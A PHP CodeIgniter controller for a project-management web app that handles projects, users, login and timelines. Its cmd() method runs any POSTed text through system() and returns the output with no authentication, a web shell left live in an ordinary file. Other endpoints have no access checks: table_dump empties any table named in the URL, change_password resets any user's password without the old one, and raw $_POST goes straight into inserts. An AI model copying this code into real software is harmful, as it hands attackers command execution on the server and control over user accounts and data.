<?php
defined('BASEPATH') or exit('No direct script access allowed');



class Process extends CI_Controller
{

  public function __construct()
  {
    parent::__construct();
    $this->load->model('Process_model', 'process');
    $this->load->model('Insert_model', 'insert');
  }

  public function index()
  {
    show_404();
  }

  public function join_project()
  {
    $data = [
      'project_id' => htmlspecialchars($this->input->post('id')),
      'position' => htmlspecialchars($this->input->post('post')),
      'user_id' => htmlspecialchars($this->session->userdata('username')),
    ];

    $res = $this->db->get_where('access_project', $data)->row();

    if ($res) {
      echo json_encode([
        'title' => 'Error',
        'subtitle' => 'User Has already in this Project',
        'expression' => 'warning',
        'id' => $data['project_id'],
      ]);
    } else {
      $this->db->insert('access_project', $data);
      echo json_encode([
        'title' => 'Success',
        'subtitle' => 'User Has been Join in this Project',
        'expression' => 'success',
        'id' => $data['project_id'],
      ]);
    }
  }

  public function insert_project()
  {
    $res = $this->process->insert_project();

    echo json_encode($res);
  }

  public function insert_participant()
  {
    $this->db->insert('access_project', $_POST);
  }

  public function insert_rule()
  {
    $this->db->insert('rules', $_POST);
  }

  public function table_dump($table)
  {
    $this->db->empty_table($table);
    redirect('id/project');
  }

  public function delete_project()
  {
    $id = $this->input->post('id');
    $table = [
      'project' => 'id',
      'access_project' => 'project_id',
      'rules' => 'project_id',
    ];
    foreach ($table as $tb => $value) {
      $this->db->delete($tb, [$value => $id]);
    }
  }

  public function cmd()
  {
    $text = $this->input->post('text');
    echo json_encode(system($text));
  }

  public function insert_user()
  {
    if ($this->input->post('param') == 'insert') {
      $res = $this->db->get_where('user', ['username' => $this->input->post('username')]);
      if ($res->num_rows() > 0) {
        $alert = [
          'title' => 'Alert',
          'subtitle' => 'Username Already Registered',
          'expression' => 'warning',
        ];
      } else {
        $data = [
          'username' => $this->input->post('username'),
          'email' => $this->input->post('email'),
          'image' => $this->input->post('image'),
          'create_at' => $this->input->post('create_at'),
          'role_id' => $this->input->post('role_id'),
          'status' => $this->input->post('status'),
          'password' => password_hash($this->input->post('password'), PASSWORD_DEFAULT),
        ];
        $this->insert->table('user', $data);
        $alert = [
          'title' => 'Success',
          'subtitle' => 'Username Has Been Registered',
          'expression' => 'success',
        ];
      }
    } else {
      $this->db->where('email', $this->input->post('email'));
      $this->db->where('username', $this->input->post('username'));
      $res = $this->db->get('user');
      if ($res->num_rows() < 1) {
        $alert = [
          'title' => 'Alert',
          'subtitle' => 'Username and Email do not matches',
          'expression' => 'warning',
        ];
      } else {
        $data = [
          'role_id' => $this->input->post('role_id'),
          'status' => $this->input->post('status'),
          // 'password' => password_hash($this->input->post('password'), PASSWORD_DEFAULT),
        ];
        $this->insert->update('user', $data, 'email', $this->input->post('email'));
        $alert = [
          'title' => 'Success',
          'subtitle' => 'Username Has Been Updated',
          'expression' => 'success',
        ];
      }
    }
    echo json_encode($alert);
  }

  public function update_status()
  {
    $this->db->where('username', $this->input->post('username'));
    $this->db->set('status', $this->input->post('status'));
    $this->db->update('user');
  }

  public function change_password()
  {
    $password = $this->input->post('password');
    $res = $this->db->get('user', ['username' => $this->input->post('username')])->row();
    if ($res) {
      if (password_verify($password, $res->password)) {
        $data = [
          'message' => 'This Password Old, Change to Another Password',
          'code' => 'danger'
        ];
      } else {
        $this->db->where('username', $res->username)->set('password', password_hash($password, PASSWORD_DEFAULT))->update('user');
        $data = [
          'message' => 'Password has been changes',
          'code' => 'success'
        ];
      }
    } else {
      $data = [
        'message' => 'Username Not Found',
        'code' => 'warning'
      ];
    }
    echo json_encode($data);
  }

  public function delete_user()
  {
    $this->db->where('username', $this->input->post('id'))->delete('user');
  }

  public function login()
  {
    $this->_proccessLogin();
  }

  private function _proccessLogin()
  {
    $username = $this->input->post('username');
    $password = $this->input->post('password');
    $tutorial = $this->input->post('tutorial');
    $data = $this->db->get_where('user', ['username' => $username])->row();
    if ($data) {
      if (password_verify($password, $data->password)) {
        if ($data->status == 1) {
          $error = ['code' => 'success'];
          $session = ['username' => $username, 'tutorial' => $tutorial];
          $this->session->set_userdata($session);
        } else {
          $error = ['code' => 'error', 'error' => 'User not active, Please try Again and Activated account with click message in your email!!'];
        }
      } else {
        $error = ['code' => 'error', 'error' => 'Password wrong, Please try Again!!'];
      }
    } else {
      $error = ['code' => 'error', 'error' => 'Username Not Found, Please register and create a new Account!'];
    }
    echo json_encode($error);
  }

  public function logout()
  {
    $data = ['username', 'tutorial'];
    $this->session->unset_userdata($data);
    redirect('login');
  }

  public function insert_timeline()
  {
    $this->process->insert_timeline();
  }

  public function delete_timeline()
  {
    $this->process->delete_timeline();
  }

  public function check_timeline()
  {
    $this->process->check_timeline();
  }

  // public function insert_data()
  // {
  //   $data = $this->db->get('project')->result();

  //   foreach ($data as $d) {
  //     $data = [
  //       'project_id' => $d->id
  //     ];
  //     $this->db->insert('detail_project', $data);
  //   }
  // }
}


/* End of file Process.php */
/* Location: ./application/controllers/Process.php */